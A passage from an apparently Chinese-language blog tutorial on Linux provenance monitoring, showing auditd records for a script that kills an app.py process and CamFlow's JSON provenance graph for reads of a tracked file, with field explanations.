<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : proctitle&#x3D;&#x2F;bin&#x2F;sh .&#x2F;kill.sh </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : item&#x3D;2 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : item&#x3D;1 name&#x3D;&#x2F;bin&#x2F;sh inode&#x3D;131279 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : item&#x3D;0 name&#x3D;.&#x2F;kill.sh inode&#x3D;394586 dev&#x3D;08:05 mode&#x3D;file,775 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 </span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : argc&#x3D;2 a0&#x3D;&#x2F;bin&#x2F;sh a1&#x3D;.&#x2F;kill.sh </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.560:622) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x56083a0e3330 a1&#x3D;0x56083a320e80 a2&#x3D;0x56083a0ba670 a3&#x3D;0x8 items&#x3D;3 ppid&#x3D;3698 pid&#x3D;4248 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;kill.sh exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;dash subj&#x3D;unconfined key&#x3D;exe_cmd</span><br><span class="line"></span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : proctitle&#x3D;ps -ef </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;ps inode&#x3D;132043 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 </span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : argc&#x3D;2 a0&#x3D;ps a1&#x3D;-ef </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:623) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d4381470 a1&#x3D;0x5579d4380f88 a2&#x3D;0x5579d4381268 a3&#x3D;0x5579d4381230 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4249 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;ps exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;ps subj&#x3D;unconfined key&#x3D;exe_cmd</span><br><span class="line"></span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : proctitle&#x3D;awk &#123;print $2&#125; </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;awk inode&#x3D;131801 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 </span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : argc&#x3D;2 a0&#x3D;awk a1&#x3D;&#123;print $2&#125; </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:624) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d43814d0 a1&#x3D;0x5579d4380f90 a2&#x3D;0x5579d43812c8 a3&#x3D;0x5579d4381238 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4251 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;awk exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;mawk subj&#x3D;unconfined key&#x3D;exe_cmd</span><br><span class="line"></span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : proctitle&#x3D;grep app.py </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;grep inode&#x3D;131525 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 </span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : argc&#x3D;2 a0&#x3D;grep a1&#x3D;app.py </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:625) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d43814a0 a1&#x3D;0x5579d4380f88 a2&#x3D;0x5579d4381298 a3&#x3D;0x5579d4381210 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4250 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;grep exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;grep subj&#x3D;unconfined key&#x3D;exe_cmd</span><br><span class="line"></span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : proctitle&#x3D;xargs kill -9 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;xargs inode&#x3D;132402 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 </span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : argc&#x3D;3 a0&#x3D;xargs a1&#x3D;kill a2&#x3D;-9 </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.564:626) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5579d4381500 a1&#x3D;0x5579d4380fa0 a2&#x3D;0x5579d43812f8 a3&#x3D;0x5579d43811f0 items&#x3D;2 ppid&#x3D;4248 pid&#x3D;4252 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;xargs exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;xargs subj&#x3D;unconfined key&#x3D;exe_cmd</span><br><span class="line"></span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : proctitle&#x3D;xargs kill -9 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : item&#x3D;1 name&#x3D;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 inode&#x3D;137165 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : item&#x3D;0 name&#x3D;&#x2F;usr&#x2F;bin&#x2F;kill inode&#x3D;131690 dev&#x3D;08:05 mode&#x3D;file,755 ouid&#x3D;root ogid&#x3D;root rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面 </span><br><span class="line">type&#x3D;EXECVE msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : argc&#x3D;4 a0&#x3D;kill a1&#x3D;-9 a2&#x3D;3689 a3&#x3D;4250 </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年01月31日 17:35:34.580:633) : arch&#x3D;x86_64 syscall&#x3D;execve success&#x3D;yes exit&#x3D;0 a0&#x3D;0x7ffc5620bf20 a1&#x3D;0x55c2c99ae690 a2&#x3D;0x7ffc5620c378 a3&#x3D;0x0 items&#x3D;2 ppid&#x3D;4252 pid&#x3D;4253 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts2 ses&#x3D;3 comm&#x3D;kill exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;kill subj&#x3D;unconfined key&#x3D;exe_cmd</span><br></pre></td></tr></table></figure>
<p>根据pid进程号和ppid父进程号分析，可以得出进程ps，awk，grep，xargs拥有同一个父进程/bin/dash，其中xargs拥有一个子进程kill，表明dash进程调用了ps，awk，grep，xargs进程，xargs进程调用了kill进程，符合<code>ps -ef |grep app.py |awk &#39;&#123;print $2&#125;&#39;|xargs kill -9</code>的进程调用，结构图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210131220311.png" alt="20210131220311"><br></br><br></br><br></br><br></br><br></br></p>
<hr>
<h1 id="CamFlow"><a href="#CamFlow" class="headerlink" title="CamFlow"></a>CamFlow</h1><ul>
<li>实验系统：Fedora</li>
<li>添加规则：camflow</li>
<li>规则用法：<a href="https://camflow.org/#walk">https://camflow.org/#walk</a></li>
<li>日志位置：/tmp/audit.log</li>
</ul>
<hr>
<h2 id="监控文件-1"><a href="#监控文件-1" class="headerlink" title="监控文件"></a>监控文件</h2><p>添加规则用于追踪fflag文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo camflow --track-file &#x2F;home&#x2F;supervampire&#x2F;fflag true</span><br><span class="line">#跟踪fflag文件，和fflag文件相关的操作记录入日志中</span><br></pre></td></tr></table></figure>
<p>执行查看fflag文件命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;supervampire&#x2F;fflag</span><br></pre></td></tr></table></figure>
<p>根据关键字fflag定位到日志位置：(日志由于太长只截取以下关键部分，<a href="https://wxt123.top/dict/CamFlow/cat.json">完整日志点击链接</a>，同时对日志内容进行了json格式化操作，方便阅读)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;entity&quot;: &#123;</span><br><span class="line">		&quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;149836&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;file&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 20,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 1000,</span><br><span class="line">			&quot;cf:gid&quot;: 1000,</span><br><span class="line">			&quot;cf:mode&quot;: &quot;0x81b4&quot;,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;unconfined_u:object_r:user_home_t:s0&quot;,</span><br><span class="line">			&quot;cf:ino&quot;: 1689,</span><br><span class="line">			&quot;cf:uuid&quot;: &quot;90365732-09d3-477e-bf09-6e627d11b666&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[file] 0&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;140630&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;process_memory&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 1000,</span><br><span class="line">			&quot;cf:gid&quot;: 1000,</span><br><span class="line">			&quot;cf:tgid&quot;: 2303,</span><br><span class="line">			&quot;cf:utsns&quot;: 4026531838,</span><br><span class="line">			&quot;cf:ipcns&quot;: 4026531839,</span><br><span class="line">			&quot;cf:mntns&quot;: 4026531840,</span><br><span class="line">			&quot;cf:pidns&quot;: 4026531836,</span><br><span class="line">			&quot;cf:netns&quot;: 4026531992,</span><br><span class="line">			&quot;cf:cgroupns&quot;: 4026531835,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[process] 0&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACTdRIrNKHN5qxcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;12356033671751943389&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;cat&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;cat&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACQ+0Ymi&#x2F;VZO3hcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;16018836571957088574&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;fflag&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;fflag&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAQAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;140630&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;process_memory&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 1,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818180&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 1000,</span><br><span class="line">			&quot;cf:gid&quot;: 1000,</span><br><span class="line">			&quot;cf:tgid&quot;: 2303,</span><br><span class="line">			&quot;cf:utsns&quot;: 4026531838,</span><br><span class="line">			&quot;cf:ipcns&quot;: 4026531839,</span><br><span class="line">			&quot;cf:mntns&quot;: 4026531840,</span><br><span class="line">			&quot;cf:pidns&quot;: 4026531836,</span><br><span class="line">			&quot;cf:netns&quot;: 4026531992,</span><br><span class="line">			&quot;cf:cgroupns&quot;: 4026531835,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[process] 1&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;used&quot;: &#123;</span><br><span class="line">		&quot;cf:gAAAAAAAIIABAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;1&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;open&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;open&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140629&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAgAAAAAIIAHAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;7&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;getattr&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;getattr&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140629&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AQAAAAAAIIAKAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;10&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;read&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;read&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAgAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;4&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140629&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;wasGeneratedBy&quot;: &#123;</span><br><span class="line">		&quot;cf:gAAAAAAAQIADAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;3&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;memory_write&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;memory_write&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140629&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:gAAAAAAAQIAIAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;8&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;memory_write&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 23,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294818170&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;prov:label&quot;: &quot;memory_write&quot;,</span><br><span class="line">			&quot;cf:allowed&quot;: &quot;true&quot;,</span><br><span class="line">			&quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAQAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;prov:entity&quot;: &quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;,</span><br><span class="line">			&quot;cf:flags&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:task_id&quot;: &quot;140629&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line">prov:type:顶点和边的属性(类型)</span><br><span class="line">cf:machine_id machine唯一标识符</span><br><span class="line">cf:boot_id 每个machine下唯一boot标识符</span><br><span class="line">cf:id 每个machine或boot下唯一顶点&#x2F;边的标识符</span><br><span class="line">cf:date 捕获时间</span><br><span class="line">cf:jiffies 在内核中捕获的jiffies(jiffies是记录着从电脑开机到现在总共的时钟中断次数)</span><br><span class="line">cf:offset 文件对象的偏移量</span><br><span class="line">cf:version 